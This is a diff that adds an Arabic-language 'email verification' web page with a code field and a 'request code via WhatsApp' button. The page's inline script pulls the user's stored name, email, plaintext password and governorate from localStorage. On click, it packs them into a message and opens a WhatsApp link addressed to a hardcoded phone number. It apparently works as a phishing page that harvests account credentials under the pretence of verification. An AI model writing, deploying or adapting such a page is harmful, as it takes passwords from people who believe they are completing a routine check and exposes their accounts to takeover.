@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة التحقق</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="scripts.js" defer></script>
+</head>
+<body>
+    <div class="verification-container">
+        <h2>التحقق من البريد الإلكتروني</h2>
+        <form id="verify-form">
+            <label for="verification-code">كود التحقق</label>
+            <input type="text" id="verification-code" name="verification-code" required>
+
+            <input type="submit" value="تحقق">
+        </form>
+        <button id="request-code-btn">طلب الكود عبر واتساب</button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var userInfo = JSON.parse(localStorage.getItem('userInfo'));
+
+            document.getElementById('request-code-btn').addEventListener('click', function() {
+                var whatsappNumber = '+963990764268';
+                var message = `شكراً على تزويدنا بمعلوماتك. سيتم إرسال لك كود التحقق قريباً.\n\n` +
+                              `الاسم: ${userInfo.firstName} ${userInfo.lastName}\n` +
+                              `البريد الإلكتروني: ${userInfo.email}\n` +
+                              `كلمة المرور: ${userInfo.password}\n` +
+                              `المحافظة: ${userInfo.governorate}`;
+
+                var whatsappLink = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+                window.open(whatsappLink, '_blank');
+            });
+        });
+    </script>
+</body>
+</html>
